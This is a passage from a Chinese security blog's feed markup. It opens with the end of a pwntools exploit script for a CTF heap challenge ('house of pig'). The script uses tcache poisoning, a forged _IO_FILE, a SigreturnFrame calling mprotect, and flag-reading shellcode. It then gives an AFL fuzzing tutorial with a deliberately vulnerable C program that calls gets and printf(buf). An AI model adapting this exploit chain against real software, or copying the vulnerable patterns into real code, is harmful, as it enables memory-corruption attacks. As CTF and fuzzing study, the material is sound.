class="number">2</span>)</span><br><span class="line">Show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">':'</span>)</span><br><span class="line">libc_base = u64(sh.recv(<span class="number">8</span>)) - <span class="number">0x1e0c00</span>  </span><br><span class="line"></span><br><span class="line">log.success(<span class="string">'libc_base: '</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x20</span>):</span><br><span class="line">    Add(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">IO_str_vtable = libc_base + <span class="number">0x1e2560</span></span><br><span class="line"></span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">setcontext = libc_base + <span class="number">0x52970</span> + <span class="number">61</span></span><br><span class="line">gadget = libc_base + <span class="number">0x000000000014a0a0</span></span><br><span class="line"></span><br><span class="line">fake_IO_FILE = <span class="number">2</span>*p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>)                    <span class="comment">#change _IO_write_base = 1</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0xffffffffffff</span>)        <span class="comment">#change _IO_write_ptr = 0xffffffffffff</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(heap_base+<span class="number">0x500</span>)                <span class="comment">#v4</span></span><br><span class="line">fake_IO_FILE += p64(heap_base+<span class="number">0x508</span>)                <span class="comment">#v5</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xb0</span>, <span class="string">b'\x00'</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)                    <span class="comment">#change _mode = 0</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xc8</span>, <span class="string">b'\x00'</span>)</span><br><span class="line">fake_IO_FILE += p64(IO_str_vtable) </span><br><span class="line">payload = fake_IO_FILE + <span class="string">b'/bin/sh\x00'</span> + <span class="number">2</span>*p64(setcontext)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(payload)//<span class="number">0x10</span> + <span class="number">1</span>):</span><br><span class="line">    Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">    Dlete(<span class="number">0</span>)</span><br><span class="line">    Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">    Dlete(<span class="number">0</span>)</span><br><span class="line">    Edit(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0x20</span> + <span class="number">0x10</span>*i)))</span><br><span class="line">    Add(<span class="number">2</span>)</span><br><span class="line">    Add(<span class="number">2</span>)</span><br><span class="line">    Edit(<span class="number">2</span>, payload[i*<span class="number">0x10</span>:(i+<span class="number">1</span>)*<span class="number">0x10</span>])</span><br><span class="line"><span class="comment"># put free_hook on tcache in 0x80 size</span></span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0xc0</span>)))</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">2</span>, p64((free_hook)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># set tcache size</span></span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0x10</span>)))</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">2</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x101000000</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># write rdi address </span></span><br><span class="line"></span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0x500</span>)))</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">2</span>, p64(gadget) + p64(<span class="number">0x300</span> + heap_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># set shellcode addr</span></span><br><span class="line"></span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0x520</span>)))</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">2</span>, p64(<span class="number">0</span>) + p64(heap_base + <span class="number">0x900</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># set frame</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">'''</span></span><br><span class="line"><span class="string">mov rax,0x67616c662f2e</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi,rsp</span></span><br><span class="line"><span class="string">mov rsi,0</span></span><br><span class="line"><span class="string">mov rdx,0</span></span><br><span class="line"><span class="string">mov rax,2</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi,rax</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov rdx,1024</span></span><br><span class="line"><span class="string">mov rax,0</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi,1</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov rdx,rax</span></span><br><span class="line"><span class="string">mov rax,1</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi,0</span></span><br><span class="line"><span class="string">mov rax,60</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rsp = heap_base + <span class="number">0x528</span></span><br><span class="line">frame.rdi = heap_base</span><br><span class="line">frame.rsi = <span class="number">0x5000</span></span><br><span class="line">frame.rdx = <span class="number">4</span> | <span class="number">2</span> | <span class="number">1</span></span><br><span class="line">frame.rip = libc.sym[<span class="string">'mprotect'</span>] + libc_base</span><br><span class="line">payload = bytes(frame)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(payload)//<span class="number">0x10</span>):</span><br><span class="line">    Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">    Dlete(<span class="number">0</span>)</span><br><span class="line">    Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">    Dlete(<span class="number">0</span>)</span><br><span class="line">    Edit(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0x300</span> + i*<span class="number">0x10</span>)))</span><br><span class="line">    Add(<span class="number">2</span>)</span><br><span class="line">    Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    Edit(<span class="number">2</span>, payload[i*<span class="number">0x10</span>: (i+<span class="number">1</span>)*<span class="number">0x10</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0x320</span>)))</span><br><span class="line"></span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">2</span>, p64(setcontext))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># # set shellcode in heap</span></span><br><span class="line">payload = bytes(asm(shellcode))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(payload)//<span class="number">0x10</span>):</span><br><span class="line">    Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">    Dlete(<span class="number">0</span>)</span><br><span class="line">    Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">    Dlete(<span class="number">0</span>)</span><br><span class="line">    Edit(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0x900</span> + i*<span class="number">0x10</span>)))</span><br><span class="line">    Add(<span class="number">2</span>)</span><br><span class="line">    Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    Edit(<span class="number">2</span>, payload[i*<span class="number">0x10</span>: (i+<span class="number">1</span>)*<span class="number">0x10</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># #Create a fake fastbin chains</span></span><br><span class="line"></span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0x820</span>)))</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">2</span>, p64(key ^ (heap_base + <span class="number">0x830</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0x840</span>)))</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">2</span>, p64(key ^ (heap_base + <span class="number">0x850</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0x860</span>)))</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">2</span>, p64(key ^ (heap_base + <span class="number">0x870</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0x880</span>)))</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">2</span>, p64(key ^ (heap_base + <span class="number">0x890</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0x8a0</span>)))</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">2</span>, p64(key ^ (heap_base + <span class="number">0x8b0</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0x8c0</span>)))</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">2</span>, p64((libc_base + libc.sym[<span class="string">'_IO_2_1_stderr_'</span>] + <span class="number">0x60</span> - <span class="number">0x10</span>) ^ key)+ p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0x90</span>)))</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">    Dlete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">Dlete(<span class="number">1</span>)</span><br><span class="line">Edit(<span class="number">1</span>, p64(key ^ (heap_base + <span class="number">0x810</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    Add(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">0</span>, p64(key))</span><br><span class="line">Add(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">Add(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">2</span>, p64(libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Add(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="0x04-附件"><a href="#0x04-附件" class="headerlink" title="0x04 附件"></a>0x04 附件</h2><p>链接: <a href="https://pan.baidu.com/s/1okMdhQF0z8RQmEOCQM6eng" target="_blank" rel="noopener">https://pan.baidu.com/s/1okMdhQF0z8RQmEOCQM6eng</a> 提取码: 5871</p>
<h2 id="0x05参考"><a href="#0x05参考" class="headerlink" title="0x05参考"></a>0x05参考</h2><p>!(<a href="https://www.anquanke.com/post/id/242640" target="_blank" rel="noopener">house of pig一个新的堆利用详解 - 安全客，安全资讯平台 (anquanke.com)</a>)</p>
]]></content>
      <categories>
        <category>pwn题writeup</category>
      </categories>
  </entry>
  <entry>
    <title>AFL初探</title>
    <url>/year/11/19/cl7iordmc0005293ft7ttnmjd/</url>
    <content><![CDATA[<p>最近在写跟AFL有关的fuzz，因此就大概过了一下AFL的源码。这里大概记录一下自己看的过程。</p>
<a id="more"></a>

<h2 id="0x01-AFL基本使用"><a href="#0x01-AFL基本使用" class="headerlink" title="0x01 AFL基本使用"></a>0x01 AFL基本使用</h2><h3 id="1-1-使用AFL程序插桩"><a href="#1-1-使用AFL程序插桩" class="headerlink" title="1.1 使用AFL程序插桩"></a>1.1 使用AFL程序插桩</h3><p>目标程序</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vuln</span><span class="params">(<span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(str);</span><br><span class="line">    <span class="keyword">if</span>(str[<span class="number">0</span>] == <span class="string">'A'</span> &amp;&amp; len == <span class="number">66</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        raise(SIGSEGV);</span><br><span class="line">        <span class="comment">//如果输入的字符串的首字符为A并且长度为66，则异常退出</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(str[<span class="number">0</span>] == <span class="string">'F'</span> &amp;&amp; len == <span class="number">6</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        raise(SIGSEGV);</span><br><span class="line">        <span class="comment">//如果输入的字符串的首字符为F并且长度为6，则异常退出</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"it is good!\\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    gets(buf);<span class="comment">//存在栈溢出漏洞</span></span><br><span class="line">    <span class="built_in">printf</span>(buf);<span class="comment">//存在格式化字符串漏洞</span></span><br><span class="line">    vuln(buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用afl-gcc进行插桩编译</p>
<blockquote>
<p>afl-gcc -g -o ./zerotest/vuln ./zerotest/vuln.c</p>
</blockquote>
<h3 id="1-2-开始fuzz"><a href="#1-2-开始fuzz" class="headerlink" title="1.2 开始fuzz"></a>1.2 开始fuzz</h3><blockquote>
<p>afl-fuzz -m 300 -i ./zerotest/fuzz_in -o ./zerotest/fuzz_out ./zerotest/vuln -f</p>
</blockquote>
<p>PS: 常见参数的含义如下</p>
<ul>
<li>f参数表示：testcase的内容会作为afl_test的stdin</li>
<li>m参数表示分配的内存空间</li>
<li>i 指定测试样本的路径</li>
<li>o 指定输出结果的路径</li>
<li>/dev/null 使错误信息不输出到屏幕</li>
<li>t：设置程序运行超时值，单位为 ms</li>
<li>M：运行主(Master) Fuzzer</li>
<li>S：运行从属(Slave) Fuzzer</li>
</ul>
<h3 id="1-3-fuzz的结果"><a href="#1-3-fuzz的结果" class="headerlink" title="1.3 fuzz的结果"></a>1.3 fuzz的结果</h3><p><img src="https://pic.imgdb.cn/item/6197bea02ab3f51d910dd366.png" alt="Image.png"></p>
<p>从界面上主要注意以下几点:</p>
<ol>
<li>last new path 如果报错那么要及时修正命令行参数，不然继续fuzz也是徒劳（因为路径是不会改变的）；</li>
<li>cycles done 如果变绿就说明后面及时继续fuzz，出现crash的几率也很低了，可以选择在这个时候停止</li>
<li>uniq crashes 代表的是crash的数量</li>
</ol>
<h3 id="1-4-crash分析"><a href="#1-4-crash分析" class="headerlink" title="1.4 crash分析"></a>1.4 crash分析</h3><p><img src="https://pic.imgdb.cn/item/6197beb62ab3f51d910de2e1.png" alt="Image [2].png"></p>
<p>PS: xxd命令的作用就是将一个文件以十六进制的形式显示出来</p>
<p>看起来上面两个crash，第一个大概是栈溢出，第二个看起来是F开头，字符长度为6触发的</p>
<h2 id="0x02-源码阅读"><a href="#0x02-源码阅读" class="headerlink" title="0x02 源码阅读"></a>0x02 源码阅读</h2><h3 id="2-1-合法代码插桩——插入调用-afl-maybe-log的汇编码"><a href="#2-1-合法代码插桩——插入调用-afl-maybe-log的汇编码" class="headerlink" title="2.1 合法代码插桩——插入调用__afl_maybe_log的汇编码"></a>2.1 合法代码插桩——插入调用__afl_maybe_log的汇编码</h3><p>若<code>pass_thru</code>、<code>skip_intel</code>、<code>skip_app</code>、<code>skip_csect</code>四个标志位均被清除，且<code>instr_ok</code>(这个标志位表征当前读入的行处于.text部分，将在后续设置，初始为清除状态)、<code>instrument_next</code>两个标志位均被设置，且当前行的第一个字符是<code>\\t</code>且第二个字符是字母，则向已插桩的文件写入<code>trampoline_fmt_64/trampoline_fmt_32</code>(取决于use_64bit标志位状态)<br>经整理最后插入的汇编代码为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/* --- AFL TRAMPOLINE (32-BIT) --- */</span><br><span class="line">.align 4</span><br><span class="line">leal -16(%esp), %esp</span><br><span class="line">movl %edi,  0(%esp)</span><br><span class="line">movl %edx,  4(%esp)</span><br><span class="line">movl %ecx,  8(%esp)</span><br><span class="line">movl %eax, 12(%esp)</span><br><span class="line">movl $0x%08x, %ecx</span><br><span class="line">call __afl_maybe_log</span><br><span class="line">movl 12(%esp), %eax</span><br><span class="line">movl  8(%esp), %ecx</span><br><span class="line">movl  4(%esp), %edx</span><br><span class="line">movl  0(%esp), %edi</span><br><span class="line">leal 16(%esp), %esp</span><br><span class="line">/* --- END --- */</span><br><span class="line"></span><br><span class="line">/* --- AFL TRAMPOLINE (64-BIT) --- */</span><br><span class="line">.align 4</span><br><span class="line">leaq -(128+24)(%rsp), %rsp</span><br><span class="line">movq %rdx,  0(%rsp)</span><br><span class="line">movq %rcx,  8(%rsp)</span><br><span class="line">movq %rax, 16(%rsp)</span><br><span class="line">movq $0x%08x, %rcx</span><br><span class="line">call __afl_maybe_log</span><br><span class="line">movq 16(%rsp), %rax</span><br><span class="line">movq  8(%rsp), %rcx</span><br><span class="line">movq  0(%rsp), %rdx</span><br><span class="line">leaq (128+24)(%rsp), %rsp</span><br><span class="line">/* --- END --- */</span><br></pre></td></tr></table></figure>

<p>⚠️：此处的<code>%08x</code>由<code>(random() % ((1 &lt;&lt; 16)))</code>生成，在编译期确定。插入结束后，将<code>instrument_next</code>标志位清除，桩代码计数器<code>ins_lines</code>加一。最后将原始的汇编码（即line变量的内容），追加到插桩后文件中。此时检查<code>pass_thru</code>标志位是否被置位，若已置位，则忽略以下流程，继续循环，读取下一行待插桩文件。</p>
<h3 id="2-2-寻找合法有效的待插桩段"><a href="#2-2-寻找合法有效的待插桩段" class="headerlink" title="2.2 寻找合法有效的待插桩段"></a>2.2 寻找合法有效的待插桩段</h3><p>这里是真正的插桩函数的核心了，但是在这里我们真正感兴趣的事实上只有<code>.text</code>段</p>
<p>简单概括就是，先找到<code>.text</code>段，不在该段的情况下不会进行打桩操作</p>
<p>然后会在分支跳转（条件分支跳转）的部分插入<code>trampoline_fmt_64/trampoline_fmt_32</code></p>
<p>注意，JMP表示无条件跳转，因此其另一条分支将永远不会被运行到，那么将不会影响代码覆盖率，因此不在JMP指令后插桩。</p>
<p>识别label以后，会在label的下一行插入<code>trampoline_fmt_64/trampoline_fmt_32</code></p>
<h3 id="2-3-末尾插桩代码"><a href="#2-3-末尾插桩代码" class="headerlink" title="2.3 末尾插桩代码"></a>2.3 末尾插桩代码</h3><p>最后，若桩代码计数器<code>ins_lines</code>不为0，那么将<code>main_payload_64/main_payload_32</code>(取决于use_64bit标志位状态)插入整个汇编文件末尾。</p>
<p>main_payload_64整体逻辑如下</p>
<p>简要概括就是，将随机生成的<code>rcx</code>与一个值做一个抑或，再把以此作为索引的共享区加一。<br>相当于一个散列表，这样可以知道fuzz是不是经过了一个新的基本块。</p>
<h2 id="0x03-AFL-变异部分源码分析"><a href="#0x03-AFL-变异部分源码分析" class="headerlink" title="0x03 AFL 变异部分源码分析"></a>0x03 AFL 变异部分源码分析</h2><h3 id="3-1-fuzz-one"><a href="#3-1-fuzz-one" class="headerlink" title="3.1 fuzz_one"></a>3.1 fuzz_one</h3><blockquote>
<p>Take the current entry from the queue, fuzz it for a while. This function is a tad too long…</p>
</blockquote>
<p>首先把testcase映射在内存中，主要是把<code>testcase</code>里的内容读进<code>in_buf</code>里</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Map the test case into memory. */</span></span><br><span class="line"></span><br><span class="line">  fd = open(queue_cur-&gt;fname, O_RDONLY);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) PFATAL(<span class="string">"Unable to open '%s'"</span>, queue_cur-&gt;fname);</span><br><span class="line"></span><br><span class="line">  len = queue_cur-&gt;len;</span><br><span class="line"></span><br><span class="line">  orig_in = in_buf = mmap(<span class="number">0</span>, len, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (orig_in == MAP_FAILED) PFATAL(<span class="string">"Unable to mmap '%s'"</span>, queue_cur-&gt;fname);</span><br><span class="line"></span><br><span class="line">  close(fd);</span><br></pre></td></tr></table></figure>

<p>接着对testcase进行一个裁剪的过程，然后把<code>in_buf</code>里的内容拷贝到<code>out_buf</code>里</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/************</span></span><br><span class="line"><span class="comment">   * TRIMMING *</span></span><br><span class="line"><span class="comment">   ************/</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!dumb_mode &amp;&amp; !queue_cur-&gt;trim_done) &#123;</span><br><span class="line"></span><br><span class="line">    u8 res = trim_case(argv, queue_cur, in_buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (res == FAULT_ERROR)</span><br><span class="line">      FATAL(<span class="string">"Unable to execute target application"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (stop_soon) &#123;</span><br><span class="line">      cur_skipped_paths++;</span><br><span class="line">      <span class="keyword">goto</span> abandon_entry;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Don't retry trimming, even if it failed. */</span></span><br><span class="line"></span><br><span class="line">    queue_cur-&gt;trim_done = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len != queue_cur-&gt;len) len = queue_cur-&gt;len;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memcpy</span>(out_buf, in_buf, len);</span><br></pre></td></tr></table></figure>

<p>计算<code>performance</code> <code>score</code> ,这个值的计算方法有点复杂，先留个坑，暂且不深究</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*********************</span></span><br><span class="line"><span class="comment">   * PERFORMANCE SCORE *</span></span><br><span class="line"><span class="comment">   *********************/</span></span><br><span class="line"></span><br><span class="line">  orig_perf = perf_score = calculate_score(queue_cur);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Skip right away if -d is given, if we have done deterministic fuzzing on</span></span><br><span class="line"><span class="comment">     this entry ourselves (was_fuzzed), or if it has gone through deterministic</span></span><br><span class="line"><span class="comment">     testing in earlier, resumed runs (passed_det). */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (skip_deterministic || queue_cur-&gt;was_fuzzed || queue_cur-&gt;passed_det)</span><br><span class="line">    <span class="keyword">goto</span> havoc_stage;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Skip deterministic fuzzing if exec path checksum puts this out of scope</span></span><br><span class="line"><span class="comment">     for this master instance. 